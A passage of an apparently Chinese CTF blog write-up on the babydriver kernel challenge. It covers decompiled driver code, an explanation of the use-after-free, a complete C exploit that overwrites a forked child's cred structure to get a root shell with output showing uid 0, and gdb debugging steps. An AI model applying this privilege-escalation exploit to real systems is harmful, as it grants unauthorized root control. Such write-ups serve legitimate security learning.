rdx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(inode, filp);</span><br><span class=\"line\">  kfree(babydev_struct.device_buf);</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;device release\\n&quot;</span>, filp, v2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babyread\"><a class=\"markdownIt-Anchor\" href=\"#babyread\">#</a> babyread</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">babyread</span><span class=\"params\">(file *filp, <span class=\"type\">char</span> *buffer, <span class=\"type\">size_t</span> length, <span class=\"type\">loff_t</span> *offset)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(filp, buffer);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !babydev_struct.device_buf )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  result = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = v4;</span><br><span class=\"line\">    copy_to_user(buffer);</span><br><span class=\"line\">    result = v6;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babywrite\"><a class=\"markdownIt-Anchor\" href=\"#babywrite\">#</a> babywrite</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">babywrite</span><span class=\"params\">(file *filp, <span class=\"type\">const</span> <span class=\"type\">char</span> *buffer, <span class=\"type\">size_t</span> length, <span class=\"type\">loff_t</span> *offset)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(filp, buffer);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !babydev_struct.device_buf )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  result = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = v4;</span><br><span class=\"line\">    copy_from_user();</span><br><span class=\"line\">    result = v6;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babyioctl\"><a class=\"markdownIt-Anchor\" href=\"#babyioctl\">#</a> babyioctl</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">babyioctl</span><span class=\"params\">(file *filp, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> command, <span class=\"type\">unsigned</span> __int64 arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class=\"line\">  v4 = v3;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( command == <span class=\"number\">65537</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    kfree(babydev_struct.device_buf);</span><br><span class=\"line\">    babydev_struct.device_buf = (<span class=\"type\">char</span> *)_kmalloc(v4, <span class=\"number\">37748928LL</span>);</span><br><span class=\"line\">    babydev_struct.device_buf_len = v4;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;alloc done\\n&quot;</span>, <span class=\"number\">37748928LL</span>, v5);</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(&amp;unk_2EB, v3, v3);</span><br><span class=\"line\">    result = <span class=\"number\">-22LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>babyioct，会释放原本的 buf，然后重新申请一个，但是不会对空间的数据进行初始化，导致数据的泄露。v4 是一个固定的大下，在 init 中初始化为我蛮传入的第三个参数。</p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>ioctl 存在一个条件竞争，使用同一个全局变量 buf，类似用户态下的 uaf。新的进程会覆盖这个变量，那么我们可以将它释放，然后重新申请出来作为新的东西，但是我们仍旧可对其进行编辑。新的进程会创建 cred, 所以就可以让他将这个空间申请出来，然后我们对其进行编辑。</p>\n<h2 id=\"完整的exp\"><a class=\"markdownIt-Anchor\" href=\"#完整的exp\">#</a> 完整的 exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;semaphore.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> <span class=\"type\">const</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"type\">int</span> fd1 = open(<span class=\"string\">&quot;dev/babydev&quot;</span>,O_RDWR);</span><br><span class=\"line\">\t<span class=\"type\">int</span> fd2 = open(<span class=\"string\">&quot;dev/babydev&quot;</span>,O_RDWR);</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">28</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"comment\">//alloc a 0xa8 space to create a fake cred</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ppid %d, pid %d\\n&quot;</span>,getppid(),getpid());</span><br><span class=\"line\">\tioctl(fd1,<span class=\"number\">65537</span>,<span class=\"number\">0xa8</span>);</span><br><span class=\"line\">\tclose(fd1);</span><br><span class=\"line\">\t<span class=\"type\">int</span> fpid = fork();      \t\t<span class=\"comment\">//create a new proc as the same as now</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fpid is %d\\n&quot;</span>,fpid);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ppid %d, pid %d\\n&quot;</span>,getppid(),getpid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!fpid)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ppid %d, pid %d\\n&quot;</span>,getppid(),getpid());</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;right&quot;</span>);</span><br><span class=\"line\">\t\twrite(fd2,buf,<span class=\"number\">28</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(getuid()==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;welcome!\\n&quot;</span>);</span><br><span class=\"line\">\t\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (fpid&lt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">\twait(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclose(fd2);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>fork 会返回两个 id, 这也是 fork 的一个有意的东西，这里其实是一个类似递归的调用，当我们 fork 一个新的进程后，其申请出来的资源与我们的原本进程是几乎一样的，只有部分数据不一样。有一些师傅说，父进程与子进程的实行顺序是不一样的。但是我们预测大部分情况下使直接进入子进程，进入子进程后还会调用 fork，但是此时 fork 返回的是 0，也就是说不会再嵌套下去。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./exp</span><br><span class=\"line\">[    3.998984] device open</span><br><span class=\"line\">[    3.999759] device open</span><br><span class=\"line\">ppid 88, pid 90</span><br><span class=\"line\">[    4.000779] alloc <span class=\"keyword\">done</span></span><br><span class=\"line\">[    4.001334] device release</span><br><span class=\"line\">fpid is 91</span><br><span class=\"line\">ppid 88, pid 90</span><br><span class=\"line\">hello</span><br><span class=\"line\">fpid is 0</span><br><span class=\"line\">ppid 90, pid 91</span><br><span class=\"line\">ppid 90, pid 91</span><br><span class=\"line\">right</span><br><span class=\"line\">welcome!</span><br><span class=\"line\"></span><br><span class=\"line\">/ <span class=\"comment\"># id</span></span><br><span class=\"line\">uid=0(root) gid=0(root) <span class=\"built_in\">groups</span>=1000(ctf)</span><br><span class=\"line\">/ <span class=\"comment\"># [  101.861273] device release</span></span><br><span class=\"line\">/ $ [  104.213209] ACPI: Preparing to enter system <span class=\"built_in\">sleep</span> state S5</span><br></pre></td></tr></table></figure>\n<p>一些师傅说，父进程与子进程的执行顺序会受到不同系统决策的影响。</p>\n<p>以我的设备为例。我们启动 exp 的进程，pid 为 90，他的父进程的 id 为 88，fork 出来的进程，返回的 id 为 91. 下面进入 fork 了吗？我们看到 pid，和 ppid 没有变，说明我们并没有进入到子进程，当我们的这部分结束后，有直接进入了 fork 里，子进程里又会调用 fork, 但是此时返回的是 0。</p>\n<h2 id=\"打包\"><a class=\"markdownIt-Anchor\" href=\"#打包\">#</a> 打包</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> File_system</span><br><span class=\"line\"><span class=\"built_in\">cp</span> rootfs.cpio ./File_system/rootfs.cpio.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> File_system</span><br><span class=\"line\">gunzip rootfs.cpio.gz</span><br><span class=\"line\">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>\n<p>上面是对文件系统的解包处理，下面的 pack.sh 会将我们写好的 exp 写入，后面启动的时候，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1wYWNrLTk1NWZtYnkzMGU2bzNhaDVhLnhuLS1zaGJvb3QtNGwyam1uLnNo\">我们可以把 pack.sh 写入 boot.sh</span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pack.sh</span><br><span class=\"line\"><span class=\"built_in\">cd</span> File_system</span><br><span class=\"line\">gcc exploit.c -static -o exp</span><br><span class=\"line\">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ../</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"调试\"><a class=\"markdownIt-Anchor\" href=\"#调试\">#</a> 调试</h2>\n<p>我们再启动的脚本里面，对 quem_system_x86_64 启用了人 - s，也就是说我们打开了一个默认的端口。我们也可以指定端口。</p>\n<p>提取 vmlinux，需要使用 extract-vmlinux 脚本提取出带符号的源码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>\n<p>启动 gdb</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb ./vmlinux -q</span><br><span class=\"line\">导入符号表,这里需要查看模块加载在内存中的真实地址，用boot.sh脚本运行之后输入命令lsmod即可</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ $ lsmod</span><br><span class=\"line\">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure>\n<p>然后在 gdb 中输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add-symbol-file **/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>\n<p>​\t两个参数分别为 babydriver.ko 在解包后的文件系统中的路径以及.text 段的地址。地址可以直接在 qemu 中查看：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20190909200711518.png\" alt=\"在这里插入图片描述\"></p>\n<p>添加远程执行参数，在 boot.sh 的 qemu 参数中添加</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-gdb tcp::7777</span><br></pre></td></tr></table></figure>\n<p>gdb 连接程序，在 gdb 中执行命令</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target remote <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"相关的结构体\"><a class=\"markdownIt-Anchor\" href=\"#相关的结构体\">#</a> 相关的结构体</h2>\n<h3 id=\"cred\"><a class=\"markdownIt-Anchor\" href=\"#cred\">#</a> cred</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">atomic_t</span>\tusage;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class=\"line\">\t<span class=\"type\">atomic_t</span>\tsubscribers;\t<span class=\"comment\">/* number of processes subscribed */</span></span><br><span class=\"line\">\t<span class=\"type\">void</span>\t\t*put_addr;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span>\tmagic;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC\t0x43736564</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC_DEAD\t0x44656144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\tuid;\t\t<span class=\"comment\">/* real UID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tgid;\t\t<span class=\"comment\">/* real GID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\tsuid;\t\t<span class=\"comment\">/* saved UID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tsgid;\t\t<span class=\"comment\">/* saved GID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\teuid;\t\t<span class=\"comment\">/* effective UID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tegid;\t\t<span class=\"comment\">/* effective GID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\tfsuid;\t\t<span class=\"comment\">/* UID for VFS ops */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tfsgid;\t\t<span class=\"comment\">/* GID for VFS ops */</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span>\tsecurebits;\t<span class=\"comment\">/* SUID-less security management */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_inheritable; <span class=\"comment\">/* caps our children can inherit */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_permitted;\t<span class=\"comment\">/* caps we&#x27;re permitted */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_effective;\t<span class=\"comment\">/* caps we can actually use */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_bset;\t<span class=\"comment\">/* capability bounding set */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_ambient;\t<span class=\"comment\">/* Ambient capability set */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_KEYS</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span>\tjit_keyring;\t<span class=\"comment\">/* default keyring to attach requested</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t * keys to */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span> __<span class=\"title\">rcu</span> *<span class=\"title\">session_keyring</span>;</span> <span class=\"comment\">/* keyring inherited over fork */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>\t*<span class=\"title\">process_keyring</span>;</span> <span class=\"comment\">/* keyring private to this process */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>\t*<span class=\"title\">thread_keyring</span>;</span> <span class=\"comment\">/* keyring private to this thread */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>\t*<span class=\"title\">request_key_auth</span>;</span> <span class=\"comment\">/* assumed request_key authority */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_SECURITY</span></span><br><span class=\"line\">\t<span class=\"type\">void</span>\t\t*security;\t<span class=\"comment\">/* subjective LSM security */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span>\t<span class=\"comment\">/* real user ID subscription */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_namespace</span> *<span class=\"title\">user_ns</span>;</span> <span class=\"comment\">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group_info</span> *<span class=\"title\">group_info</span>;</span>\t<span class=\"comment\">/* supplementary groups for euid/fsgid */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rcu_head</span>\t<span class=\"title\">rcu</span>;</span>\t\t<span class=\"comment\">/* RCU deletion hook */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//总大小0xa8，一直到gid结束是28个字节</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a class=\"markdownIt-Anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM4MTAwNTY5L2FydGljbGUvZGV0YWlscy8xMDA2NzMxMDM=\">https://blog.csdn.net/m0_38100569/article/details/100673103</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuejFyMC50b3AvMjAyMS8xMC8yOS9rZXJuZWwtcHduJUVGJUJDJTg4JUU0JUJBJThDJUVGJUJDJTg5JUU1JTlGJUJBJUU3JUExJTgwJUU3JTlGJUE1JUU4JUFGJTg2LyMlRTUlQUUlOUUlRTYlODglOTg=\">https://www.z1r0.top/2021/10/29/kernel-pwn（二）基础知识 /# 实战</span></p>\n<h3 id=\"参考博客\"><a class=\"markdownIt-Anchor\" href=\"#参考博客\">#</a> 参考博客</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuejFyMC50b3Av\">https://www.z1r0.top/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnR0bmJhMy5jbi8=\">https://arttnba3.cn/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXktY3AuZ2l0aHViLmlvL2NhdGVnb3J5Lw==\">https://ray-cp.github.io/category/</span>\t\t\t//ray 大佬写的很多知识的总结，很详尽</p>\n",
            "tags": [
                "learning"
            ]
        },
        {
            "id": "http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/",
